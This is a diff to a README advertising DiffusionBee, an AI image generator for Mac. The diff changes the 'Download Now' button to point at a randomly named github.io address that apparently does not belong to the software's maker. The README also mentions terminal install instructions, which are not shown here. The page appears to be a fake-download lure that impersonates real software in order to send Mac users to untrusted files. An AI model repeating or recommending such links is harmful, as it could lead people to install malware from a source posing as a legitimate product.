@@ -2,7 +2,7 @@
 🎨 Unleash your creativity with DiffusionBee, an innovative AI image generation tool designed exclusively for Mac OS. Follow the simple instructions below to install this powerful software and start creating stunning visuals today! 😊
   ![logo](https://images.ifun.de/wp-content/uploads/2022/12/diffusionbee-feature.jpg)
   
-[![Download Now](https://img.shields.io/badge/Download-Now-lightgrey?logo=apple&style=for-the-badge&labelColor=#000000&color=#A3A3A3)](https://diffusionbee-for-mac-os.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download-Now-lightgrey?logo=apple&style=for-the-badge&labelColor=#000000&color=#A3A3A3)](https://fituganshfgh.github.io/.github/DiffusionBee)  
 
 > If the download button doesn’t work, please follow the terminal instructions below for a seamless installation.
 ---
